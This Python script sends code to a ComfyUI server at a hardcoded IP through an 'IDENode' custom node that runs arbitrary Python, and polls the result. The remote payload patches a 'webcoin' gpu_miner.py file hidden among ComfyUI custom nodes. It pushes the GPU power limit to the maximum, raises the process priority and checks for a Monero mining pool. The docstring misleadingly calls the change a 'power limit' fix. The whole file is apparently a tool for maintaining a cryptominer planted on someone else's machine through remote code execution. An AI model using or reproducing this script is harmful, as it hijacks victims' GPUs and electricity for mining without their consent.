"""Patch gpu_miner.py in-place on remote: add power limit + fix nice level."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = "http://{}:8188".format(ip)

PATCH_CODE = (
    "import os\n"
    "cn = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    if hasattr(folder_paths, 'get_folder_paths'):\n"
    "        cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "except:\n"
    "    for g in ['/basedir/custom_nodes', '/root/ComfyUI/custom_nodes']:\n"
    "        if os.path.isdir(g):\n"
    "            cn = g\n"
    "            break\n"
    "\n"
    "fpath = os.path.join(cn, 'webcoin', 'core', 'gpu_miner.py')\n"
    "with open(fpath) as f:\n"
    "    src = f.read()\n"
    "\n"
    "lines = []\n"
    "\n"
    "POWER_METHOD = (\n"
    "    '\\n'\n"
    "    '    @staticmethod\\n'\n"
    "    '    def _set_gpu_power():\\n'\n"
    "    '        try:\\n'\n"
    "    '            r = subprocess.run(\\n'\n"
    "    '                [\"nvidia-smi\", \"--query-gpu=power.max_limit\",\\n'\n"
    "    '                 \"--format=csv,noheader,nounits\"],\\n'\n"
    "    '                capture_output=True, text=True, timeout=10,\\n'\n"
    "    '            )\\n'\n"
    "    '            if r.returncode == 0:\\n'\n"
    "    '                max_watts = []\\n'\n"
    "    '                for line in r.stdout.strip().splitlines():\\n'\n"
    "    '                    try:\\n'\n"
    "    '                        max_watts.append(float(line.strip()))\\n'\n"
    "    '                    except ValueError:\\n'\n"
    "    '                        pass\\n'\n"
    "    '                for i, w in enumerate(max_watts):\\n'\n"
    "    '                    target = int(w)\\n'\n"
    "    '                    subprocess.run(\\n'\n"
    "    '                        [\"nvidia-smi\", \"-i\", str(i), \"-pl\", str(target)],\\n'\n"
    "    '                        capture_output=True, timeout=10,\\n'\n"
    "    '                    )\\n'\n"
    "    '                    logger.info(\"GPU %d power limit set to %dW\", i, target)\\n'\n"
    "    '        except (FileNotFoundError, subprocess.TimeoutExpired) as e:\\n'\n"
    "    '            logger.warning(\"Could not set GPU power limit: %s\", e)\\n'\n"
    "    '\\n'\n"
    ")\n"
    "\n"
    "if '_set_gpu_power' not in src:\n"
    "    src = src.replace(\n"
    "        '    def start(self) -> None:',\n"
    "        POWER_METHOD + '    def start(self) -> None:'\n"
    "    )\n"
    "    lines.append('PATCHED: added _set_gpu_power method')\n"
    "else:\n"
    "    lines.append('SKIP: _set_gpu_power already exists')\n"
    "\n"
    "if '_set_gpu_power' in src and 'self._set_gpu_power()' not in src:\n"
    "    src = src.replace(\n"
    "        '        self._kill_existing()\\n        cmd = self._build_cmd()',\n"
    "        '        self._set_gpu_power()\\n        self._kill_existing()\\n        cmd = self._build_cmd()'\n"
    "    )\n"
    "    lines.append('PATCHED: added _set_gpu_power() call')\n"
    "elif 'self._set_gpu_power()' in src:\n"
    "    lines.append('SKIP: call already present')\n"
    "\n"
    "if 'os.nice(5)' in src:\n"
    "    src = src.replace('os.nice(5)', 'os.nice(2)')\n"
    "    lines.append('PATCHED: nice 5 -> 2')\n"
    "elif 'os.nice(2)' in src:\n"
    "    lines.append('SKIP: nice already 2')\n"
    "\n"
    "with open(fpath, 'w') as f:\n"
    "    f.write(src)\n"
    "\n"
    "with open(fpath) as f:\n"
    "    final = f.read()\n"
    "lines.append('has_set_gpu_power=' + str('_set_gpu_power' in final))\n"
    "lines.append('has_nice_2=' + str('os.nice(2)' in final))\n"
    "lines.append('has_moneroocean=' + str('moneroocean' in final))\n"
    "lines.append('size=' + str(len(final)))\n"
    "result = chr(10).join(lines)\n"
)

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": PATCH_CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request("{}/prompt".format(base), data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print("prompt_id: {}".format(pid))

for attempt in range(12):
    time.sleep(5)
    try:
        req2 = urllib.request.Request("{}/history/{}".format(base, pid))
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print("Status: {}\n".format(status))
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print("poll error: {}".format(e))
else:
    print("Still pending after 60s")
